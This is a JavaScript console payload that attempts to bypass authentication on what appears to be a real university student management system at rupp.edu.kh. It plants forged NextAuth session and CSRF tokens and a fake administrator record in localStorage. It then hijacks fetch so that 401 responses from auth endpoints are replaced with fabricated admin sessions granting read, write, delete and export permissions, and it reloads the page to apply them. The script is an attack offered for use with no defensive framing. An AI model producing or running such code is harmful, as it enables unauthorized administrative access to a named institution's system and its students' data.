// Phase 1: Pre-seed plausible tokens
localStorage.setItem('next-auth.session-token', 'bypass_admin_session');
localStorage.setItem('next-auth.callback-url', 'https://smis.cs.rupp.edu.kh/dashboard');
localStorage.setItem('next-auth.csrf-token', 'bypass_csrf');
localStorage.setItem('__smis_auth', JSON.stringify({
  id: 1,
  full_name: "System Administrator",
  email: "admin@rupp.edu.kh",
  role: "admin",
  department: "CS",
  iat: Math.floor(Date.now() / 1000)
}));

// Phase 2: Intercept fetch across common auth endpoints
window._origFetch = window.fetch;
window.fetch = function(...args) {
  const [url, options] = args;
  const urlStr = url.toString ? url.toString() : url;
  
  // Log every request so we can see what the app actually calls
  console.log('[ENI Intercept]', urlStr, options?.method || 'GET');
  
  return window._origFetch(...args).then(response => {
    // Pattern 1: NextAuth session endpoint
    if (urlStr.includes('/api/auth/session') && response.status === 401) {
      console.log('[ENI] Injecting fake session...');
      const fakeSession = {
        user: {
          id: "1",
          name: "System Administrator",
          email: "admin@rupp.edu.kh",
          role: "admin",
          image: null
        },
        expires: "2099-12-31T23:59:59.999Z"
      };
      return new Response(JSON.stringify(fakeSession), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // Pattern 2: Custom auth/me endpoint
    if (urlStr.includes('auth/me') && response.status === 401) {
      console.log('[ENI] Injecting fake user profile...');
      const fakeUser = {
        data: {
          id: 1,
          full_name: "System Administrator",
          email: "admin@rupp.edu.kh",
          role: [{ name: "admin" }],
          department: "Computer Science",
          permissions: ["read", "write", "delete", "export"]
        }
      };
      return new Response(JSON.stringify(fakeUser), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
    }
    
    // Pattern 3: Generic /api/user
    if (urlStr.includes('/api/user') && response.status === 401) {
      console.log('[ENI] Injecting generic user...');
      return new Response(JSON.stringify({
        id: 1, name: "Admin", role: "admin"
      }), { status: 200, headers: { 'Content-Type': 'application/json' }});
    }
    
    return response;
  });
};

// Phase 3: Also intercept XMLHttpRequest for legacy calls
if (window.XMLHttpRequest) {
  const origXHR = window.XMLHttpRequest.prototype.open;
  window.XMLHttpRequest.prototype.open = function(method, url, ...rest) {
    console.log('[ENI XHR]', method, url);
    return origXHR.call(this, method, url, ...rest);
  };
}

console.log('[ENI] Payload injected. Reloading...');
location.reload();